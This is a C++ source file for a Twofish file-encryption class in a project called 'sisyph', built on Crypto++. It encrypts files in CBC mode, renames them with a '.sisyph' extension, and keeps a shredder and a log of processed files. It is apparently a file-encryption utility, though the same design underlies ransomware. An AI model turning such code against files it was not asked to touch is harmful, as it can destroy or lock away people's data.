#include "twofish.hpp"

// Default constructed mode,
sisyph::Twofish::Twofish():
                        BlockCipher("", CryptoPP::Twofish::MAX_KEYLENGTH,
                                        CryptoPP::Twofish::BLOCKSIZE),
                        m_shredder(),
                        m_loggedFiles("loggedFiles.dat") {
}

// encryption implementation
void sisyph::Twofish::encrypt() {
    /* if extenstion of the processing file is .sisyph
     skip it, cause we that means that it is encrypted.
     We don't want to encrypt file twice
    */
    if (m_currentPath.extension() == ".sisyph") {
        std::cerr << "Already encrypted... Skipping --------> "
                  << m_currentPath.generic_string() << std::endl;
        return;
    }

    /* process file. Passing encryption template type parameter.
       We can even choose block cipher modes, that will be implemented soon.
    */
    process<CBC_Mode<CryptoPP::Twofish>::Encryption>(".sisyph");
}

// decryption implementation
void sisyph::Twofish::decrypt() {
    /* if extenstion of the processing file is not .sisyph
     skip it, cause we that means that it is decrypted.
     We don't want to decrypt file twice
    */
    if (m_currentPath.extension() != ".sisyph") {
        std::cerr << "Already decrypted... Skipping -------> "
                  << m_currentPath.generic_string() << std::endl;
        return;
    }

    /* process file. Passing decryption template type parameter,
       just like above.
       We can even choose block cipher modes, that will be implemented soon.
    */
    process<CBC_Mode<CryptoPP::Twofish>::Decryption>("");
}

// encryption key generation. Both hex encoded and decoded(in bytes);
void sisyph::Twofish::generateKey() {
    // Generate encryption key
    generate(m_byteKey, m_byteKey.size(), m_encKey);

    // Now we've gotta generate initialization vector(IV), it's important
    generateIV();
}

// initialization vector(IV) generation. Both hex encoded and decoded(in bytes);
void sisyph::Twofish::generateIV() {
    // Generate initialization vector(IV)
    generate(m_byteIV, CryptoPP::Twofish::BLOCKSIZE, m_encIV);
}

/* Get the final key representation. It consists of hex encoded key
   appended with hex encoded IV
*/
std::string sisyph::Twofish::getKey() noexcept {
    return m_encKey + m_encIV;
}

/* sets encryption key and IV. newKey is hex encoded key appended with hex
   encoded IV, which represent the overall key, or, newKey is just a filename
   with sequence of concatenated encryption key and IV
*/
void sisyph::Twofish::setKey(std::string& newKey) {
    // process new key. Set both, key and IV.
    processKey(newKey);
}
